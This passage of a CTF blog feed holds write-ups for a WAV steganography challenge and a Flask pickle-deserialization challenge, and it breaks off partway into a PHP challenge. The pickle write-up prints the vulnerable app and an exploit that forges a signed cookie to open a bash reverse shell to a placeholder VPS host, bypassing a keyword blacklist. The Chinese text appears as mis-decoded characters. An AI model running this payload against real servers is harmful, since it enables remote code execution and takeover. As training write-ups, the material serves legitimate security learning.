        <content type="html"><![CDATA[<h4 id="Hiden"><a href="#Hiden" class="headerlink" title="Hiden"></a>Hiden</h4><p>ÂØπÂéüÊúâÊñáÊú¨ËøõË°årot47Âíårot13Ëß£ÂØÜÂæóÂà∞wavÁöÑÂä†ÂØÜËÑöÊú¨</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> wave <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    txt_data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    file_len <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>txt_data<span class="token punctuation">)</span>    txt_data <span class="token operator">=</span> file_len<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> byteorder <span class="token operator">=</span> <span class="token string">'little'</span><span class="token punctuation">)</span> <span class="token operator">+</span> txt_data<span class="token keyword">with</span> wave<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"test.wav"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    attrib <span class="token operator">=</span> f<span class="token punctuation">.</span>getparams<span class="token punctuation">(</span><span class="token punctuation">)</span>        wav_data <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span> f<span class="token punctuation">.</span>readframes<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token keyword">for</span> index <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>txt_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    wav_data<span class="token punctuation">[</span>index <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> txt_data<span class="token punctuation">[</span>index<span class="token punctuation">]</span>    <span class="token keyword">with</span> wave<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"hiden.wav"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>setparams<span class="token punctuation">(</span>attrib<span class="token punctuation">)</span>     f<span class="token punctuation">.</span>writeframes<span class="token punctuation">(</span>wav_data<span class="token punctuation">)</span></code></pre><p>ÂØπËÑöÊú¨ËøõË°åÈÄÜÂêëÂç≥ÂèØÂæóÂà∞flag</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> wave<span class="token keyword">with</span> wave<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"hiden.wav"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    attrib <span class="token operator">=</span> f<span class="token punctuation">.</span>getparams<span class="token punctuation">(</span><span class="token punctuation">)</span>    wav_data <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>readframes<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>hidden_data <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> index <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>wav_data<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    hidden_data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>wav_data<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span>file_len <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>hidden_data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>extracted_data <span class="token operator">=</span> hidden_data<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span>file_len <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>extracted_data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><img src="hidden.png" loading="lazy"></p><h4 id="Lyrics-For-You-pickleÂèçÂ∫èÂàóÂåñ"><a href="#Lyrics-For-You-pickleÂèçÂ∫èÂàóÂåñ" class="headerlink" title="Lyrics For You(pickleÂèçÂ∫èÂàóÂåñ)"></a>Lyrics For You(pickleÂèçÂ∫èÂàóÂåñ)</h4><p>ÈÄöËøáÊñá‰ª∂ËØªÂèñËØªÂèñÊ∫êÁ†Å</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># app.py</span><span class="token keyword">import</span> os<span class="token keyword">import</span> random<span class="token comment"># from config.secret_key import secret_code</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> make_response<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token keyword">from</span> cookie <span class="token keyword">import</span> set_cookie<span class="token punctuation">,</span> cookie_check<span class="token punctuation">,</span> get_cookie<span class="token keyword">import</span> pickleapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> random<span class="token punctuation">.</span>randbytes<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">UserData</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> username<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>username <span class="token operator">=</span> username<span class="token keyword">def</span> <span class="token function">Waf</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">b'R'</span><span class="token punctuation">,</span> <span class="token string">b'secret'</span><span class="token punctuation">,</span> <span class="token string">b'eval'</span><span class="token punctuation">,</span> <span class="token string">b'file'</span><span class="token punctuation">,</span> <span class="token string">b'compile'</span><span class="token punctuation">,</span> <span class="token string">b'open'</span><span class="token punctuation">,</span> <span class="token string">b'os.popen'</span><span class="token punctuation">]</span>    valid <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">for</span> word <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span>        <span class="token keyword">if</span> word<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> data<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            valid <span class="token operator">=</span> <span class="token boolean">True</span>            <span class="token keyword">break</span>    <span class="token keyword">return</span> valid<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/lyrics"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">lyrics</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span><span class="token punctuation">)</span>    resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">"Content-Type"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'text/plain; charset=UTF-8'</span>    query <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"lyrics"</span><span class="token punctuation">)</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/lyrics"</span><span class="token punctuation">,</span> query<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            res <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"No lyrics found"</span>    <span class="token keyword">return</span> res<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>        user <span class="token operator">=</span> UserData<span class="token punctuation">(</span>username<span class="token punctuation">)</span>        res <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> user<span class="token punctuation">.</span>username<span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> set_cookie<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> res<span class="token punctuation">,</span> secret<span class="token operator">=</span>secret_code<span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/board"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">board</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    invalid <span class="token operator">=</span> cookie_check<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> secret<span class="token operator">=</span>secret_code<span class="token punctuation">)</span>    <span class="token keyword">if</span> invalid<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Nope, invalid code get out!"</span>    data <span class="token operator">=</span> get_cookie<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> secret<span class="token operator">=</span>secret_code<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"username"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'user.html'</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"guest"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'admin.html'</span><span class="token punctuation">,</span> name<span class="token operator">=</span>data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'user.html'</span><span class="token punctuation">,</span> name<span class="token operator">=</span>data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span></code></pre><p>ÂàÜÊûê<code>cookie.py</code>ÈÄªËæë,ÊûÑÈÄ†expÂ¶Ç‰∏ãÔºåÁõ¥Êé•ÂèçÂºπshell</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> hmac<span class="token keyword">import</span> pickle<span class="token keyword">from</span> flask <span class="token keyword">import</span> make_response<span class="token punctuation">,</span> request<span class="token builtin">unicode</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token builtin">basestring</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token comment"># Quoted from python bottle template, thanks :D</span><span class="token keyword">def</span> <span class="token function">cookie_encode</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    msg <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sig <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>hmac<span class="token punctuation">.</span>new<span class="token punctuation">(</span>tob<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> msg<span class="token punctuation">,</span> digestmod<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> tob<span class="token punctuation">(</span><span class="token string">'!'</span><span class="token punctuation">)</span> <span class="token operator">+</span> sig <span class="token operator">+</span> tob<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span> <span class="token operator">+</span> msg<span class="token keyword">def</span> <span class="token function">cookie_decode</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> tob<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span> cookie_is_encoded<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>        sig<span class="token punctuation">,</span> msg <span class="token operator">=</span> data<span class="token punctuation">.</span>split<span class="token punctuation">(</span>tob<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> _lscmp<span class="token punctuation">(</span>sig<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>hmac<span class="token punctuation">.</span>new<span class="token punctuation">(</span>tob<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> msg<span class="token punctuation">,</span> digestmod<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">b'R'</span><span class="token punctuation">,</span> <span class="token string">b'secret'</span><span class="token punctuation">,</span> <span class="token string">b'eval'</span><span class="token punctuation">,</span> <span class="token string">b'file'</span><span class="token punctuation">,</span> <span class="token string">b'compile'</span><span class="token punctuation">,</span> <span class="token string">b'open'</span><span class="token punctuation">,</span> <span class="token string">b'os.popen'</span><span class="token punctuation">]</span>    valid <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">for</span> word <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span>        <span class="token keyword">if</span> word <span class="token keyword">in</span> data<span class="token punctuation">:</span>            valid <span class="token operator">=</span> <span class="token boolean">True</span>            <span class="token comment"># print(word)</span>            <span class="token keyword">break</span>    <span class="token keyword">return</span> valid<span class="token keyword">def</span> <span class="token function">cookie_check</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> secret<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span>key<span class="token punctuation">)</span>    data <span class="token operator">=</span> tob<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">:</span>        <span class="token keyword">if</span> cookie_is_encoded<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>            sig<span class="token punctuation">,</span> msg <span class="token operator">=</span> data<span class="token punctuation">.</span>split<span class="token punctuation">(</span>tob<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> _lscmp<span class="token punctuation">(</span>sig<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>hmac<span class="token punctuation">.</span>new<span class="token punctuation">(</span>tob<span class="token punctuation">(</span>secret<span class="token punctuation">)</span><span class="token punctuation">,</span> msg<span class="token punctuation">,</span> digestmod<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                res <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>                <span class="token keyword">if</span> waf<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> <span class="token boolean">True</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">tob</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> enc<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>enc<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token builtin">unicode</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_cookie</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> secret<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    value <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span>key<span class="token punctuation">)</span>    <span class="token keyword">if</span> secret <span class="token keyword">and</span> value<span class="token punctuation">:</span>        dec <span class="token operator">=</span> cookie_decode<span class="token punctuation">(</span>value<span class="token punctuation">,</span> secret<span class="token punctuation">)</span>        <span class="token keyword">return</span> dec<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">if</span> dec <span class="token keyword">and</span> dec<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> key <span class="token keyword">else</span> default    <span class="token keyword">return</span> value <span class="token keyword">or</span> default<span class="token keyword">def</span> <span class="token function">cookie_is_encoded</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">bool</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span>tob<span class="token punctuation">(</span><span class="token string">'!'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">and</span> tob<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span> <span class="token keyword">in</span> data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">_lscmp</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token keyword">not</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token number">0</span> <span class="token keyword">if</span> x <span class="token operator">==</span> y <span class="token keyword">else</span> <span class="token number">1</span> <span class="token keyword">for</span> x<span class="token punctuation">,</span> y <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">set_cookie</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">,</span> secret<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">**</span>options<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> secret<span class="token punctuation">:</span>        value <span class="token operator">=</span> touni<span class="token punctuation">(</span>cookie_encode<span class="token punctuation">(</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">,</span> secret<span class="token punctuation">)</span><span class="token punctuation">)</span>        resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span>        resp<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> value<span class="token punctuation">,</span> max_age<span class="token operator">=</span><span class="token number">3600</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> resp    <span class="token keyword">elif</span> <span class="token keyword">not</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> <span class="token builtin">basestring</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> TypeError<span class="token punctuation">(</span><span class="token string">'Secret key missing for non-string Cookie.'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">4096</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">'Cookie value to long.'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">touni</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> enc<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">,</span> err<span class="token operator">=</span><span class="token string">'strict'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> s<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>enc<span class="token punctuation">,</span> err<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token builtin">unicode</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>opcode<span class="token operator">=</span><span class="token triple-quoted-string string">b'''(cossystemS'bash -c "bash -i >&amp; /dev/tcp/VPS/5678 0>&amp;1"'o.'''</span>secret<span class="token operator">=</span><span class="token string">"EnjoyThePlayTime123456"</span>exp <span class="token operator">=</span> touni<span class="token punctuation">(</span>cookie_encode<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">,</span> opcode<span class="token punctuation">)</span><span class="token punctuation">,</span> secret<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>exp<span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ÂÆâÂÖ®Áõ∏ÂÖ≥ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ÁæäÂüéÊùØ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BaseCTF2024-web</title>
      <link href="/2024/08/18/BaseCTF2024-web/"/>
      <url>/2024/08/18/BaseCTF2024-web/</url>
      
        <content type="html"><![CDATA[<h4 id="Aura-ÈÖ±ÁöÑÁ§ºÁâ©-url"><a href="#Aura-ÈÖ±ÁöÑÁ§ºÁâ©-url" class="headerlink" title="Aura ÈÖ±ÁöÑÁ§ºÁâ©(url@)"></a>Aura ÈÖ±ÁöÑÁ§ºÁâ©(url@)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Aura ÈÖ±ÔºåÊ¨¢ËøéÂõûÂÆ∂~ </span><span class="token comment">// ËøôÈáåÊúâ‰∏Ä‰ªΩÁ§ºÁâ©ÔºåËØ∑‰Ω†Á≠æÊî∂‰∏Ä‰∏ãÂìü~ </span><span class="token variable">$pen</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pen'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$pen</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'Aura'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ËøôÊòØ Aura ÁöÑÁ§ºÁâ©Ôºå‰Ω†‰∏çÊòØ AuraÔºÅ'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// Á§ºÁâ©Êî∂Âà∞Âï¶ÔºåÊé•‰∏ãÊù•Ë¶ÅÂéªÂçöÂÆ¢ÈáåÈù¢ÂÜô‰∏ãÊÑüÊÉ≥Âì¶~ </span><span class="token variable">$challenge</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'challenge'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$challenge</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'http://jasmineaura.github.io'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span 